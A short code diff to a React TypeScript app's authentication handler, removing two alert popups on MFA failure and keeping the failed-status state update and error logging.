@@ -96,10 +96,7 @@ const App: React.FC = () => {
           error: result.sendError || result.smsError || 'Unknown error'
         });
         
-        // Show failure message (keep on same page)
-        alert('❌ Authentication Failed. Please try again.');
-        
-        // Update UI state
+        // Update UI state but don't show alert popup
         setAuthStatus('failed');
         setMfaSelection(result.selection);
         setMfaRequired(true);
@@ -121,7 +118,7 @@ const App: React.FC = () => {
     } catch (error) {
       setMfaPending(false);
       console.error('Error:', error);
-      alert('Authentication failed. Please try again.');
+      // Removed alert popup - just log the error
     }
   };
 
